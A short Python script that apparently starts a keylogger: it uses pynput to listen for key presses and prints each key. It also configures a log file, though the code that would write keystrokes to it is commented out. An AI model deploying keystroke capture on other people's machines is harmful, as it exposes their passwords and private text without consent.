from pynput.keyboard import Key, Listener
import logging
from os import path


#creating a log files
log_dir = ""

#format  the login
logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

#monitor keyboard input
def on_press(key):
    print("this is what is being typed: ",key)
    # word = []
    # while key != key.space:
    #     word.append(key)
    #     logging.info(str(key))
    #
    # word = []
    # if key == key.esc:
    #     return False
with Listener(on_press=on_press) as listener:
    listener.join()
